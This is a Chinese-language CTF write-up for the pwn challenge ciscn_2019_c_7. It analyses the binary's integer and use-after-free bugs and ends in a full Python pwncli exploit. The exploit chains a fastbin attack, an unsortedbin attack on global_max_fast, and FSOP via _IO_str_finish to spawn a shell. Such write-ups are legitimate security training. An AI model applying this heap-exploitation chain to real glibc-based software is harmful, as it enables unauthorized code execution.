# ciscn_2019_c_7



### 总结

主要是限制了`UAF`的`chunk`的大小为`0x20`，并且限制了`add`的次数，就很难受，并且题目用的还是`calloc`，没有使用`tcache`。最后还是使用`fastbin attack`+`unsortedbin attack` + `FSOP`获取到的`shell`。                                                                                                                                                                                                                                                                                          

- `fastbin attack`用于修改`chunk size`
- `unsortedbin attack`用于修改`fast_global_max`
- `FSOP`利用`IO_str_finish`拿`shell`

<!-- more -->

### 题目分析

#### checksec

![image-20210905163450354](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20210905163450354.png)

#### 题目分析

#### 结构体

逆向分析出`Servent`的结构体如下：

```c
struct Servent
{
  char *name;
  uint64_t aggressivity; // 攻击力
};
```



#### 漏洞点

漏洞`1`：`recruite`中的`size`可以为负数，下面做减法就会得到一个很大的正数，这样先把`money`搞到很大

![image-20210905163700580](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20210905163700580.png)

漏洞`2`：`expel`分支

![image-20210905163812863](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20210905163812863.png)

漏洞`3`：可以任意地址置为`0`，这个漏洞我没用到。但是隐约猜到了用处。

![image-20210905163948660](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20210905163948660.png)



别的漏洞就没看到了。

### 利用过程

- 利用漏洞`1`将`money`搞到很大
- 利用漏洞`2`，修改某个`chunk`的`size`，泄露出堆和`libc`地址
- 还是利用漏洞`2`，进行`unsortedbin attack`，打`global_max_fast`
- 释放一个很大的`chunk`，刚好覆盖掉`_IO_list_all`
- 利用`FSOP`拿`shell`

### Exp

```python
#!/usr/bin/python3
from pwncli import *

cli_script()

p:tube = gift['io']
elf:ELF = gift['elf']
libc: ELF = gift['libc']


def recruite(size:(tuple, list), name:(tuple, list)):
    p.sendlineafter("Give me your choice:\n", "1")
    p.sendlineafter("How many servents do you want to rescruit?\n", str(len(size)))
    for i in range(len(size)):
        p.sendlineafter("Input the name's size of this servent:\n", str(size[i]))
        p.sendafter("Input the name of this servent:\n", name[i])


def expel(idx:int):
    p.sendlineafter("Give me your choice:\n", "2")
    p.sendlineafter("Tell me his index number:\n", str(idx))
    p.recvuntil("Ok, I'll kill ")
    msg = p.recvline()
    info("msg recv: {}".format(msg))
    return msg


def buy_weapon(weapon_type:int):
    p.sendlineafter("Give me your choice:\n", "3")
    p.sendlineafter("2.Excalibur      --90000yuan\n", str(weapon_type))


def attack_boss(use_big_weapon='n'):
    p.sendlineafter("Give me your choice:\n", "4")
    msg = p.recvline()
    if  b"Do you want to use excalibur?" in msg:
        p.sendline(use_big_weapon)

# 搞钱
p.sendlineafter("How much money do you want?\n", "-1")
p.sendlineafter("Give me your choice:\n", "1")
p.sendlineafter("How many servents do you want to rescruit?\n", str(-10000))

buy_weapon(2)

# 为堆风水布局
recruite([0x18, 0x18, 0x18, 0x2000], [flat(0, 0x21), flat(0, 0x21), flat(0, 0x21), flat({0x400:[[0, 0x21, 0, 0] * 2], 0x1410:[[0, 0x21, 0, 0] * 2]})])

expel(1)
expel(1)

# 泄露堆地址 
leak_addr = expel(1)

heap_base_addr = u64(leak_addr[:6].ljust(8, b"\x00")) - 0x2a0

log_address("heap_base_addr", heap_base_addr)

# fastbin attack
for _ in range(5):
    expel(1)

expel(0)
expel(1)
expel(0)

recruite([0x18], [flat([0, 0x21, heap_base_addr + 0x280], length=0x18)])

# change size
recruite([0x40, 0x18], ["a", flat(0, 0x71)])

for i in range(8):
    expel(1)

# 改完size后得到一个大的chunk，释放它
expel(0)

recruite([0x60], [flat({0:heap_base_addr + 0x2e0, 0x30: [0, 0x471]})])

expel(2)

# 泄露libc地址
leak_addr = expel(1)
libc_base_addr = u64(leak_addr[:6].ljust(8, b"\x00")) - 0x3ebca0
log_address("libc_base_addr", libc_base_addr)

libc.address = libc_base_addr

expel(0)

# unsortedbin attack
global_max_fast_offset = 0x3ed940
recruite([0x60], [flat({0x30:[0, 0x471, 0, libc_base_addr + global_max_fast_offset - 0x10]}, filler="\x00")])

expel(0)

str_jumps_offset = 0x3e8360
lock_offset = 0x3ed8c0
bin_sh_offset = 0x1b3e9a

payload = flat({
    0x30: [0, 0x1441],
    0x30+0x80: 0,
    0x30+0x88: libc_base_addr + lock_offset, # lock
    0x30+0xc0: 0,
    0x30+0x28: 0xffffffffffffff, # write_ptr
    0x30+0xd8: libc_base_addr + str_jumps_offset - 8, # IO_str_jumps
    0x30+0x38: libc_base_addr + bin_sh_offset, # /bin/sh
    0x30+0xe8: libc.sym['system']
}, filler="\x00")

recruite([0x460], [payload])

# 覆盖掉_IO_list_all
expel(3)

# 执行exit
attack_boss()

p.interactive()
```

构造大的`chunk`：

![image-20210905164720758](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20210905164720758.png)

`unsortedbin attack`:

![image-20210905164816865](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20210905164816865.png)

覆盖掉`_IO_list_all`：

![image-20210905165000433](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20210905165000433.png)

最后拿到`shell`：

![image-20210905183820599](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20210905183820599.png)

### 引用与参考

1、[My Blog](https://roderickchan.github.io)

2、[Ctf Wiki](https://ctf-wiki.org/)

3、[pwncli](https://github.com/RoderickChan/pwncli)

---

> 作者: [roderick](https://www.roderickchan.cn)  
> URL: https://www.roderickchan.cn/zh-cn/2021-08-29-ciscn-2019-c-7/  

